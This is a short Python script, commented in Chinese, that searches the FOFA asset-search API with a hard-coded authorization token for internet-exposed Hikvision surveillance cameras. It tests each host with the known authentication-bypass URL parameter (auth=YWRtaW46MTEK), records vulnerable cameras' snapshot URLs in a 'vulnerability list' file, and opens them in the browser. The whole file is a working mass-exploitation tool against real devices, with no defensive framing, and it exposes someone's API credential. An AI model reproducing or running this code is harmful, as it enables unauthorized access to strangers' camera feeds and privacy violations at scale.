import base64
import socket
import time
import urllib
import webbrowser

import requests

def search(keyword, pn):
    url = 'https://api.fofa.so/v1/search'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Referer': 'https://fofa.so/',
        'Authorization': 'eyJhbGciOiJIUzUxMiIsImtpZCI6Ik5XWTVZakF4TVRkalltSTJNRFZsWXpRM05EWXdaakF3TURVMlkyWTNZemd3TUdRd1pUTmpZUT09IiwidHlwIjoiSldUIn0.eyJpZCI6MTE5MDk4LCJtaWQiOjEwMDA3MTE1MCwidXNlcm5hbWUiOiLpmL_kuIPljYHlm5siLCJleHAiOjE2MjgzNTAwNDd9.JV_DQYAbUvGUZQ6qdmGT6trR7nb4dNKJeSdjDp8O5mya9CQxh7Yk9cOcFzgRsmwXwlrcA6ayimwhQjJAU8Uhvw',
        'Cache-Control': 'no-cache',
        'Origin': 'https://fofa.so',
        'Connection': 'keep-alive',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
    }
    params = (
        ('q', keyword),
        ('qbase64', base64.b64encode(keyword.encode('utf-8'))),
        ('full', 'false'),
        ('pn', str(pn)),
        ('ps', '10'),
    )
    res = requests.get(url, headers=headers, params=params)
    data = res.json()['data']['assets']
    return data


def detect(host):
    # host='219.137.38.68:89'
    url='http://%s/Security/users?auth=YWRtaW46MTEK'%host
    socket.setdefaulttimeout(3)
    try:
        status = urllib.request.urlopen(url).code
        print(status)
        if status==200:
            return 1
    except Exception as err:
        print(err)
    return 0


savename = '漏洞列表'
# keyword = 'HIKVISION-视频监控'
keyword = 'app="HIKVISION-视频监控"'
# data = search(keyword, pn=1)
# result = []


def main():
    # savename = '漏洞列表'
    # keyword = 'app="HIKVISION-视频监控"'
    result = []
    for pn in range(0,10):
        data = search(keyword, pn)
        for d in data:
            host = d['id']
            ip = d['ip']
            try:
                if detect(host):
                    result.append('http://%s/onvif-http/snapshot?auth=YWRtaW46MTEK' % host)
                    print('"%s"存在漏洞!' % host)
                else:
                    print('"%s"不存在漏洞!' % host)
            except:
                print('"%s"不存在漏洞!' % ip)
        print('第%d页，共计发现%d个漏洞网站' %(pn,len(result)))
        # print('共计发现%d个漏洞网站' %len(result))
        if len(result) != 0:
            with open('./%s.txt' % savename, 'a') as f:
                for r in result:
                    f.write(r + '\n')
    # openUrlBatch()

def openUrlBatch():
    with open("漏洞列表.txt") as fp:
        for ebayno in fp:
            url = ebayno.strip()
            time.sleep(1)  # 打开间隔时间
            webbrowser.open(url)  # 打开网页



if __name__ == "__main__":  # 当程序执行时
    # 调用函数
    # main()
    # init_db("movietest.db")
    openUrlBatch()
    print("爬取完毕！")